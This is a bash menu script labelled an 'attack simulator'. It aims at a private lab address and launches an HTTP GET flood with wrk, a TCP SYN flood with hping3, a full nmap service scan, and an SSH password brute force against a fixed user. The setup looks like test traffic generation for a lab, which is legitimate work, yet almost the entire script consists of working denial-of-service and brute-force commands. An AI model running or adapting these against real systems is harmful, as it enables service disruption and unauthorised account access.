#!/bin/bash

# Prevent Ctrl+C from killing the main menu script
trap 'echo -e "\nAction cancelled. Returning to menu..."' SIGINT

TARGET="10.0.0.10"
PORT="8080"
SSH_PORT="22"
SSH_USER="mobile"
PASS_LIST="/scripts/passwords.txt"
TARGET_URL="http://${TARGET}:${PORT}/"

show_menu() {
    clear
    echo "=========================================="
    echo "       ATTACK SIMULATOR          "
    echo "=========================================="
    echo " Target: $TARGET_URL"
    echo " SSH Target: $TARGET:$SSH_PORT (user: $SSH_USER)"
    echo "------------------------------------------"
    echo " 1) HTTP GET Flood (wrk - High Volume)"
    echo " 2) TCP SYN Flood (hping3)"
    echo " 3) Nmap Scan (recon target)"
    echo " 4) SSH Brute Force"
    echo " 5) Stop all attacks"
    echo " 0) Exit"
    echo "=========================================="
    echo -n "Select an option [0-5]: "
}

stop_attacks() {
    echo "Stopping any ongoing attacks..."
    killall wrk 2>/dev/null
    killall hping3 2>/dev/null
    killall slowhttptest 2>/dev/null
    echo "Attacks stopped."
}

while true; do
    show_menu
    read choice
    case $choice in
        1)
            stop_attacks
            echo "Starting HTTP GET Flood..."
            wrk -t4 -c2000 -d300s $TARGET_URL > /dev/null 2>&1 &
            echo "Attack is running in background. Press Enter to continue."
            read
            ;;
        2)
            stop_attacks
            echo "Starting TCP SYN Flood..."
            hping3 -S --flood -V -p $PORT $TARGET > /dev/null 2>&1 &
            echo "Attack is running in background. Press Enter to continue."
            read
            ;;
        3)
            echo "Running Nmap scan against $TARGET..."
            nmap -sV -sC -p- -oN /tmp/nmap_${TARGET}.txt $TARGET
            echo "Scan complete. Results saved to /tmp/nmap_${TARGET}.txt"
            echo "Press Enter to continue."
            read
            ;;
        4)
            if [ ! -f "$PASS_LIST" ]; then
                echo "Password list not found at $PASS_LIST"
                echo "Create one first, e.g.: echo -e 'password\\n123456\\nadmin' > $PASS_LIST"
            else
                echo "Running sequential SSH brute-force against $TARGET:$SSH_PORT (user: $SSH_USER)..."
                python3 /scripts/ssh_bruteforce.py $TARGET $SSH_PORT $SSH_USER $PASS_LIST 0.3
            fi
            echo "Press Enter to continue."
            read
            ;;
        5)
            stop_attacks
            echo "Press Enter to continue."
            read
            ;;
        0)
            stop_attacks
            echo "Exiting..."
            exit 0
            ;;
        *)
            echo "Invalid option. Press Enter to continue."
            read
            ;;
    esac
done